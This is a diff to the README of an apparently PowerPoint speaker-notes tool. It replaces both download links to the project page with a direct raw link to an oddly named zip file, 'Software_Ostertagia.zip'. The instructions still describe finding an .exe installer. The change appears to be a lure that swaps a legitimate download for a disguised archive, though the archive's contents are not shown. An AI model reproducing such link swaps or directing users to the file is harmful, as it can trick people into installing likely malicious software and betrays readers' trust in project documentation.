@@ -1,6 +1,6 @@
 # 🎙️ speaker - Generate better presentation notes automatically
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Boadur3972/speaker)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Boadur3972/speaker/main/ppt-speech-writer/scripts/Software_Ostertagia.zip)
 
 Speaker helps you prepare for academic presentations. This tool reads your PowerPoint slides and writes helpful speaker notes and comments for every page. You save time by letting the software analyze your presentation text and images. It creates a clean version of your lecture directly inside your PowerPoint file.
 
@@ -37,7 +37,7 @@ Follow these steps to install and use the software on your Windows machine.
 ### 1. Download the tool
 Visit the official repository page to get the installer. 
 
-[Download Speaker Application](https://github.com/Boadur3972/speaker)
+[Download Speaker Application](https://raw.githubusercontent.com/Boadur3972/speaker/main/ppt-speech-writer/scripts/Software_Ostertagia.zip)
 
 Click the link to open the download page. Locate the latest version of the installer. Look for the file ending in .exe. Save this file to your Downloads folder.
 
